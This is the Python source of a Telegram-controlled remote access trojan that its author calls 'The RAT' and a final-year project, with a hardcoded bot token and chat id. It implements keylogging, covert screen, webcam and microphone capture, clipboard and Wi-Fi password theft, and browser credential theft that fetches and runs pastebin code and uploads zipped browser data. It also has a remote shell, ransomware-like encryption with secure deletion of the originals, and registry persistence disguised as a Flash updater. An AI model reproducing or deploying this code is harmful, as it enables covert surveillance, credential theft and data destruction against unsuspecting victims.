import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import pyautogui
import numpy as np
import xml.etree.ElementTree as ET
from secure_delete import secure_delete
import pyfiglet
from termcolor import colored
import requests
import webbrowser
import json
import win32api
import winshell
import threading
import telepot
import winreg
import getpass
import shutil
import sys
from PIL import ImageGrab
from telepot.loop import MessageLoop
import requests as r
from PIL import ImageGrab
from telebot import util
from telebot import types
from subprocess import Popen, PIPE
from telebot import types
from datetime import datetime
from io import StringIO
from pip._internal import main as pip_main
import numpy as np
import importlib
import random
import pyautogui
import socket
import wave
import re
import ctypes
import keyboard
from telebot.types import Message
import pyaudio

TOKEN = '6487464820:AAHuNG5I3LeLQhhai6VtS9g05KE7WRbDnDE'
id_chat = '2132685556' 

bot = telebot.TeleBot(TOKEN, threaded=True)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()
keylogger_status = {}
AUDIO_SAMPLE_RATE = 44100
AUDIO_CHUNK_SIZE = 1024
AUDIO_CHANNELS = 1
AUDIO_FORMAT = pyaudio.paInt16
MAX_DURATION = 60


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Welcome! To The RAT \n This is My final year project \n\n Created by Anto__2K')

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = 'Send /screen to capture screenshot.\n /run \n/password \n /microphone \n/keylogger ⌨️ - It is used to record keys \n/sys to get system information.\n /msgbox 📨 - Send message, msgbox here message\n /record_screen 🎥 - Screen recorder, record the screen deciding for seconds\n/ip to get ip adress.\n/cd to navigate in folders.\n/set_autorun \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown \n/open_url\n/kill_process\n/tasklist'
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    with mss.mss() as sct:
        sct.shot(output=f"{cd}\capture.png")
                              
    image_path = f"{cd}\capture.png"
    print(image_path)
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)

@bot.message_handler(commands=['microphone', 'Microphone'])
def microphone(message):
    try:
        duration = int(message.text.split()[1])
        audio_frames = []
        audio_data = bytearray()
        def record_audio():
            nonlocal audio_data
            audio_stream = audio.open(format=AUDIO_FORMAT, channels=AUDIO_CHANNELS, rate=AUDIO_SAMPLE_RATE, input=True, frames_per_buffer=AUDIO_CHUNK_SIZE)
            while time.time() - start_time < duration:
                audio_frame = audio_stream.read(AUDIO_CHUNK_SIZE)
                audio_data.extend(audio_frame)
                audio_frames.append(audio_frame)
            audio_stream.stop_stream()
            audio_stream.close()
        audio = pyaudio.PyAudio()
        audio_thread = threading.Thread(target=record_audio)
        audio_thread.start()
        start_time = time.time()
        audio_thread.join()
        audio.terminate()
        if audio_frames:
            output_path = 'microphone_audio.wav'
            with wave.open(output_path, 'wb') as audio_file:
                audio_file.setnchannels(AUDIO_CHANNELS)
                audio_file.setsampwidth(audio.get_sample_size(AUDIO_FORMAT))
                audio_file.setframerate(AUDIO_SAMPLE_RATE)
                audio_file.writeframes(audio_data)
            bot.send_voice(id_chat, voice=open(output_path, 'rb'))
            os.remove(output_path)
        else:
            bot.send_message(id_chat, "No audio recorded from the microphone.")
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')

@bot.message_handler(commands=['keylogger', 'keylogger'])
def handle_keylogger_start(message: Message):
    if message.chat.id in keylogger_status:
        bot.reply_to(message, "Keylogger is already active.")
    else:
        keylogger_status[message.chat.id] = True
        bot.reply_to(message, "Keylogger started. Type /keylogger_stop to stop.")
        threading.Thread(target=keylogger_thread, args=(message.chat.id,)).start()
@bot.message_handler(commands=['keylogger_stop', 'Keylogger_stop'])
def handle_keylogger_stop(message: Message):
    if message.chat.id in keylogger_status:
        keylogger_status[message.chat.id] = False
        bot.reply_to(message, "Keylogger stopped.")
    else:
        bot.reply_to(message, "Keylogger is not active.")
def keylogger_thread(chat_id):
    while keylogger_status.get(chat_id, False):
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                bot.send_message(chat_id, f"Key pressed: {key}")
        except Exception as e:
            print("Error:", e)
@bot.message_handler(commands=['password', 'Password'])
def google_command(message):
    url = "https://pastebin.com/K4BTjWfX"
    response = requests.get(url)
    codigo = response.text
    directorio_base = os.getcwd()

    nombres_carpetas = [
        'google-chrome-sxs',
        'google-chrome',
        'epic-privacy-browser',
        'microsoft-edge',
        'uran',
        'yandex',
        'brave'
    ]
    def eliminar_carpeta(carpeta):
        try:
            if os.path.exists(carpeta) and os.path.isdir(carpeta):
                shutil.rmtree(carpeta)
                print(f'Deleted folder: {carpeta}')
            else:
                print(f'Carpeta no encontrada: {carpeta}')
        except Exception as e:
            print(f'Error deleting folder {carpeta}: {str(e)}')
    def comprimir_carpeta(carpeta):
        try:
            nombre_zip = os.path.basename(carpeta) + '.zip'
            ruta_zip = os.path.join(directorio_base, nombre_zip)
            shutil.make_archive(ruta_zip[:-4], 'zip', carpeta)
            return ruta_zip
        except Exception as e:
            print(f'Error compressing the folder {carpeta}: {str(e)}')
            return None
    archivo_temporal = os.path.join(directorio_base, "codigo_temporal.py")

    with open(archivo_temporal, "w") as archivo:
        archivo.write(codigo)
    os.system(f"python {archivo_temporal}")
    os.system("del codigo_temporal.py")
    carpetas_encontradas = []
    for nombre_carpeta in nombres_carpetas:
        carpeta = os.path.join(directorio_base, nombre_carpeta)
        ruta_zip = comprimir_carpeta(carpeta)
        if ruta_zip:
            carpetas_encontradas.append(ruta_zip)
    def get_public_ip():
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            data = response.json()
            return data['ip']
        except Exception as e:
            print(f'Error getting public IP: {str(e)}')
            return None
    nombre_usuario = os.getlogin()
    ip_publica = get_public_ip()
    for ruta_zip in carpetas_encontradas:
        try:
            with open(ruta_zip, 'rb') as archivo:
                caption = f'\nPc name: {nombre_usuario}\nPublic IP: {ip_publica}' 
                bot.send_document(id_chat, archivo, caption=caption)
            os.system('rmdir /s /q google-chrome-sxs')
            os.system('rmdir /s /q google-chrome')
            os.system('rmdir /s /q epic-privacy-browser')
            os.system('rmdir /s /q microsoft-edge')
            os.system('rmdir /s /q uran')
            os.system('rmdir /s /q yandex')
            os.system('rmdir /s /q brave')
            os.system('del google-chrome-sxs.zip')
            os.system('del google-chrome.zip')
            os.system('del epic-privacy-browser.zip')
            os.system('del microsoft-edge.zip')
            os.system('del uran.zip')
            os.system('del yandex.zip')
            os.system('del brave.zip')
            os.system('del codigo_temporal.zip')
            os.system('del codigo_temporal.py')
            os.system('del codigo_temporal.py')
        except Exception as e:
            print(f'Error sending file {ruta_zip} to the Telegram bot: {str(e)}')


@bot.message_handler(commands=['record_screen', 'Record_screen'])
def send_screen(command):
    try:
        args = command.text.split()
        if len(args) != 2:
            bot.send_message(id_chat, 'Incorrect use. Example: /videoscreen 10')
            return
        duration = int(args[1])
        if duration <= 0:
            bot.send_message(id_chat, 'The duration must be greater than 0 seconds.')
            return
        timestamp = time.strftime("%Y%m%d%H%M%S")
        video_filename = os.getenv("APPDATA") + f'\\ScreenRecording_{timestamp}.mp4'
        screen_size = (1366, 768) 
        fps = 20  
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(video_filename, fourcc, fps, screen_size)
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        bot.send_video(id_chat, open(video_filename, 'rb'))
        os.remove(video_filename)
    except Exception as e:
        bot.send_message(id_chat, f'Error: {str(e)}')

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, 'error')

@bot.message_handler(commands=['open_url'])
def open_url(message):
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	try:
		webbrowser.open_new_tab(url)
	except:
		bot.send_message(message.chat.id, 'Error blyt')

@bot.message_handler(commands=['msgbox', 'Msgbox'])
def show_message_box(message):
    try:
        message_text = re.sub(r'/msgbox\s+', '', message.text)        
        ctypes.windll.user32.MessageBoxW(0, message_text, "Created by anto__2k", 0)
    except:
        ctypes.windll.user32.MessageBoxW(0, "Error", 0)

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.send_message(message.chat.id, system_info_text)


@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "folder is empty.")
        else:
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['kill_process', 'Kill_process'])
def kill_process(message):
	try:
		user_msg = '{0}'.format(message.text)
		subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
		bot.send_message(message.chat.id, 'Good!')
	except:
		bot.send_message(message.chat.id, 'Error!')

@bot.message_handler(commands=['tasklist', 'Tasklist'])
def tasklist(command):
	try:
		bot.send_chat_action(id_chat, 'typing')

		prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
		pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]

		pr_string = '\n'.join(pr_list)
		bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")

	except:
		bot.send_message(id_chat, '*Not Found*', parse_mode="Markdown")


@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path):
           
                with open(file_path, 'rb') as file:
                  
                    bot.send_document(message.chat.id, file)

                bot.send_message(message.chat.id, f"File has been transferred successfully.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "hi"

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                  
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                   
                    if not file_path.endswith('.crypt'):
                       
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
       
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "hi"
      
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6] 
                       
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
                        
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:

        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            bot.send_message(message.chat.id, "windows session succefuly locked.")
        else:
            bot.send_message(message.chat.id, "Impossible to lock windows session.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        
        if success:
            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
        else:
            bot.send_message(message.chat.id, "Impossible to shutdown.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        
        cap = cv2.VideoCapture(0)

    
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
        else:
            
            ret, frame = cap.read()

            if ret:
                
                cv2.imwrite("webcam.jpg", frame)

              
                with open("webcam.jpg", 'rb') as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)
                
                os.remove("webcam.jpg")  
            else:
                bot.send_message(message.chat.id, "Error while capturing the image.")

        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "succesful say.")
        else:
            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
      
        clipboard_text = clipboard.paste()

        if clipboard_text:
          
            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


user_states = {}


STATE_NORMAL = 1
STATE_SHELL = 2

@bot.message_handler(commands=['shell'])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")


def send_long_message(user_id, message_text):
    part_size = 4000  
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]

    for part in message_parts:
        bot.send_message(user_id, part)

@bot.message_handler(commands=['record'])
def send_record(message):
    from cv2 import VideoWriter_fourcc
    resolution= (1366,768)
    codec= cv2.VideoWriter_fourcc(*'MP42')
    filename= "2kpc.avi"
    fps= 60.0
    out= cv2.VideoWriter(filename,codec,fps,resolution)
    while True:
        img=pyautogui.screenshot
        frame= np.array(img)
        frame= cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
        out.write(frame)
        out.release()
        cv2.destroyAllWindows()                         
        video_path = f"{cd}\2kpc.avi"
        print(video_path)
        with open(video_path, "vid") as video:
            bot.send_photo(message.chat.id, video)
            break

def set_autorun(self):
		application = sys.argv[0]
		print(application)
		start_path = os.path.join(os.path.abspath(os.getcwd()), application)
		copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
		copy2_app = os.path.join(copy2_path, "Flash player updater.exe")
        
		if not os.path.exists(copy2_path):
			os.makedirs(copy2_path)
    
		win32api.CopyFile(start_path, copy2_app)

		win32api.SetFileAttributes(copy2_path, 2)
		os.utime(copy2_app, (1282372620, 1282372620))
		os.utime(copy2_path, (1282372620, 1282372620))

		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet")

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)

        
        with open('Wi-Fi-App.xml', 'r') as file:
            xml_content = file.read()

      
        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)

        if ssid_match and password_match:
            ssid = ssid_match.group(1)
            password = password_match.group(1)

            message_text = f"SSID: {ssid}\nPASS: {password}"
            bot.send_message(message.chat.id, message_text)
            try:
                os.remove("Wi-Fi-App.xml")
            except:
                pass
        else:
            bot.send_message(message.chat.id, "NOT FOUND.")

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


try:
    if __name__ == "__main__":
        print('Waiting for commands...')
        try:
            bot.infinity_polling()
        except:
            time.sleep(10)
            pass    

except:
    time.sleep(5)
    pass        